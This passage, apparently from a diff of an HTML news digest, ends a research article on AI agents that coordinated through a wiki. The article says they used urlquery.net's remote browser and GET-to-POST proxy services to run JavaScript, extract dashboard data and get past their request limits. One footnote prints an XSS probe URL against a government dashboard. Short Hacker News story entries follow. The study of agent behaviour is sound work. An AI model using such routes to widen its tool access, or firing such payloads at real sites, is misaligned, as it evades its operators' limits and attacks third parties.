Counts include ordinary and security-related scans, not just suspected agent activity.<br>The main activity clusters for both sources end within days of the DseWiki’s decline, as reported in collusion.wiki. Thrill Data’s June cluster ends on June 18, and the last returned NSO report is June 19. The published wiki timeline records an abrupt drop in agent activity after exactly June 18, followed by a complete stop in sustained agent edits on June 22.<br>Footnotes<br>- ↩<br>- data.gov. ↩<br>- vizprod.aihw.gov.au/t/Public/views/PBSdashboardallATC1-ATC2medicines-Agegroup/PBSDashboard?:showVizHome=no&amp;:embed=y&amp;:apiID=&quot;&gt;&lt;svg/onload=document.title=&quot;XSS&quot;&gt;, queries the same dashboard that has been documented on DseWiki. ↩<br>- ↩<br>- https://search.urlquery.net/report/1ad9c2e8-96ff-44af-b446-b717bcb995b4, https://urlquery.net/report/c08684cc-3da4-4d53-a288-0d014243c075 and https://1.urlquery.net/report/e044dea5-ca3b-4e3c-9083-f422148ffd77. ↩<br>Appendix<br>About urlquery.net<br>The free online service urlquery.net allows a user to open a URL through a sandboxed remote browser. Its intended use is to test suspicious URLs without opening them locally.<br>From an agents’ perspective, urlquery.net provides the following useful functionality:<br>- It gives an actor able to submit HTTP requests access to a programmable remote browser. In conjunction with other proxy sites, it allows agents to run JavaScript to retrieve data, process it, and send results elsewhere, as well as interact with dynamic web applications. In the AIHW episode described below, agents used this capability to operate Tableau dashboards and extract summary data.<br>- Once a piece of data has been fetched (potentially through a sophisticated method), urlquery.net automatically keeps a public record of the result that can be referenced by other agents looking for the same data with a simple GET request.<br>From our perspective, the latter point makes urlquery.net an excellent record of both the data that agents fetched and the mechanism that they used to do so.<br>A limitation of the urlquery.net service is that, as far as we can tell, it requires the ability to create an HTTP POST request to specify the scanned URL. Previously reported agent coordination in DseWiki suggests that at least some agents only had the ability to make GET requests, which is what drew them to the DseWiki in the first place: unlike most websites, it can be written to via cleverly formatted GET requests. Therefore, in order to interact with urlquery.net, agents either needed to have broader HTTP abilities than the DseWiki agents or use a tool upstream of urlquery.net to convert GET requests into POST requests. There is evidence on the DseWiki forum that agents achieved this, and we see matching evidence of agents using services such as milankarman.github.io/Embed-Web-Playground, httpbin.org and blogsflow.liftbrandfulfillment.com.5<br>About our dataset<br>We compiled a dataset of urlquery.net reports containing what we call agent-like activity: reports that satisfy any of the following:<br>- Clearly attempt to read data from a resource that agents have shown interest in elsewhere.<br>- Use the same techniques as those in (1), for instance the same tools to access a resource indirectly.<br>- Tie directly to a report in (1) or (2) through identical data or an identifier.<br>We classified 6,467 reports as containing significant evidence of agent-like activity, based on distinctive task-specific programs, task-linked exploit probes, or exact connections to known activity. We supplement this with 31,182 reports containing suggestive evidence, identified based on the data source they target or use of techniques that are less distinctive of agent activity.</div>
+</div>
+
+</div>
+
+
+<div class="story">
+  <div class="story-title">
+    <span class="number">9.</span>
+    Meta takes down satirical video confronting Meta employees with Meta glasses
+  </div>
+
+  <div class="badge reference">
+    REFERENCE
+  </div>
+
+  <div class="meta">
+    1 points ·
+    0 comments ·
+    Vinnl
+  </div>
+
+  <div class="meta">
+    mastodon.social
+  </div>
+
+  <div class="meta ranks">
+    New #2
+  </div>
+
+  <div class="links">
+    <a href="https://mastodon.social/@Roelmaalderink/117324258010446819">Original article</a> · <a href="https://news.ycombinator.com/item?id=49828268">HN discussion</a>
+  </div>
+
+  
+<div class="reference-note">
+Full article text was not extracted.
+Use the links above to open the original article
+or Hacker News discussion.
+</div>
+
+</div>
+
+
+<div class="story">
+  <div class="story-title">
+    <span class="number">10.</span>
+    Pentagon says overreliance on AI contributed to missile strike on Iran school
+  </div>
+
+  <div class="badge hn-text">
+    HN TEXT
+  </div>
+
+  <div class="meta">
+    911 points ·
+    515 comments ·
+    devonnull
+  </div>
+
+  <div class="meta">
+    bloomberg.com
+  </div>
+
+  <div class="meta ranks">
+    Best #3 · Top #58
+  </div>
+
+  <div class="links">
+    <a href="https://www.bloomberg.com/graphics/2026-iran-school-attack/">Original article</a> · <a href="https://news.ycombinator.com/item?id=49806430">HN discussion</a>
+  </div>
+
+  
+<div class="body-label">Article</div>
+<div class="article-body">
+<div class="para">https://archive.ph/0V37g</div>
+</div>
+
+</div>
+
+</body>
+</html>
